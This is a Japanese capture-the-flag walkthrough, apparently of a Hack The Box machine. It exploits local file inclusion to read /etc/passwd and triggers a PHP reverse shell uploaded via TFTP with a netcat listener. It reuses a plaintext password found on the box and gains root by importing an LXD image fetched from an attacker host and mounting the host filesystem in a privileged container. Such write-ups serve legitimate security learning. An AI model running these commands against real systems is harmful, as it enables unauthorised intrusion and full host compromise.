
# 1.Port Scan
ip=10.129.95.185

対象IPのUDPポートをスキャン
UDPサービスを発見

`sudo nmap -sC -sV -sU $ip`

![b65e19b390e9e240c5dcf9a241a36ee8.png](../_resources/b65e19b390e9e240c5dcf9a241a36ee8.png)

## Web Site Search
`sudo nmap -sC -sV $ip`
再度スキャンを行いwebsiteを発見

![5df4e05cfe733dab8537af6bac469e94.png](../_resources/5df4e05cfe733dab8537af6bac469e94.png)

発見したwebsite

![9e88bd615a2c5176661a894e6318bd34.png](../_resources/9e88bd615a2c5176661a894e6318bd34.png)

## Curl
下図赤枠内のfile=home.phpを改ざんすればユーザのアカウント情報を格納していると思われるディレクトリを発見できると推測

![8df75eb5fb90680a1b50dec707590ad1.png](../_resources/8df75eb5fb90680a1b50dec707590ad1.png)

`curl 'http://$ip?file=/etc/passwd'`

![e9a74f51551877510af972086c4b679d.png](../_resources/e9a74f51551877510af972086c4b679d.png)

TFTPで接続

![2a374c192a19e799ea171db9e565a9f3.png](../_resources/2a374c192a19e799ea171db9e565a9f3.png)



# 2.TFTP Connect

指定ポートを解放

`nc -lvnp 1234`

![112c34b64d77f1d93f3a9e94eb415c54.png](../_resources/112c34b64d77f1d93f3a9e94eb415c54.png)

TFTPにアップロードしてスクリプトを起動
指定サーバーに接続

 `curl 'http://10.129.138.138?file=/var/lib/tftpboot/php-reverse-shell.php'`
  

![377831cf17aef46da907a14906ed433c.png](../_resources/377831cf17aef46da907a14906ed433c.png)

ホームディレクトリからuser.txtがあるmikeユーザを発見
権限が足らない事を確認。


![1f86e52cc09c9449d58332c97f24eb24.png](../_resources/1f86e52cc09c9449d58332c97f24eb24.png)

TFTPを使用してることから/var/www/html/を確認する

パスワードらしきものを発見

`ls -la /var/www/html/`

mike:Sheffield19

![b79298d51cd5858ba58b06f28a5dbfbc.png](../_resources/b79298d51cd5858ba58b06f28a5dbfbc.png)

ターミナルを起動


`python3 -c 'import pty;pty.spawn("/bin/bash")'`

![83c21c5942aa032e47b7a4e28e15e071.png](../_resources/83c21c5942aa032e47b7a4e28e15e071.png)

## 2. Get mike account

user.txtを取得

![8ea57feebe9210484dc9580867fcd655.png](../_resources/8ea57feebe9210484dc9580867fcd655.png)


# 3.build

`sudo apt install -y git golang-go debootstrap squashfs-tools` 

![cd3ba386faf24752aaef98e01e19feb1.png](../_resources/cd3ba386faf24752aaef98e01e19feb1.png)

`git clone https://github.com/lxc/distrobuilder`

![4f947d4c58f12b3055d861fde39c085c.png](../_resources/4f947d4c58f12b3055d861fde39c085c.png)

`cd distrobuilder`

`make`

![7bbcc2d94ef907f971e5e903d55dc8d5.png](../_resources/7bbcc2d94ef907f971e5e903d55dc8d5.png)

`mkdir -p ContainrImages/alpine/`

`ls`

`cd ContainerImages/alpine/`

`pwd`

`ls`

`wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml`  

`sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.8`

![f891266ca79b5f3f665123f715ee2274.png](../_resources/f891266ca79b5f3f665123f715ee2274.png)

# 4. server bild

`wget http://10.10.16.4:8000/lxd.tar.xz`

![69c4bbe3f8b8acd7a737189197e624b7.png](../_resources/69c4bbe3f8b8acd7a737189197e624b7.png)

`wget http://10.10.16.4:8000/rootfs.squashfs`

![171fa8c4b144e080a1c112409a2969b2.png](../_resources/171fa8c4b144e080a1c112409a2969b2.png)

`lxc image import lxd.tar.xz rootfs.squashfs --alias alpine`

![bef959fb710f39571f2f94eb6623ea98.png](../_resources/bef959fb710f39571f2f94eb6623ea98.png)

`lxc image list`

![aa97ed30bc5738636aaf5c3bf132136a.png](../_resources/aa97ed30bc5738636aaf5c3bf132136a.png)

`lxc init alpine privesc -c security.privileged=true`

![236f80794e7e79c8632bf5a70ab7d0c2.png](../_resources/236f80794e7e79c8632bf5a70ab7d0c2.png)

`lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true`

![d8efb862f967715eea894624d6550c70.png](../_resources/d8efb862f967715eea894624d6550c70.png)

`lxc start privesc`

`lxc exec privesc /bin/sh`

`id`

`cd /mnt/root/root`

`ls -al`

`cat root.txt`

![5b2af83de7d5eeef24e9b3c11d5ecb8b.png](../_resources/5b2af83de7d5eeef24e9b3c11d5ecb8b.png)


